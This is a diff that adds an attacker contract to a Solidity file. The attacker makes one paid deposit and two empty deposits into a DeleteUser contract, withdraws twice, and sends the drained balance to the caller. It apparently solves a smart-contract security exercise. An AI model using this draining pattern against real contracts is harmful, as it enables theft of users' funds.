@@ -29,3 +29,19 @@ contract DeleteUser {
         msg.sender.call{value: amount}("");
     }
 }
+
+contract DeleteUserAttacker {
+    function attack(DeleteUser victim) external payable {
+        victim.deposit{value: 1 ether}();
+        victim.deposit();
+        victim.deposit();
+
+        victim.withdraw(1);
+        victim.withdraw(1);
+
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
+        require(ok, "Transfer must succeed");
+    }
+
+    receive() external payable {}
+}
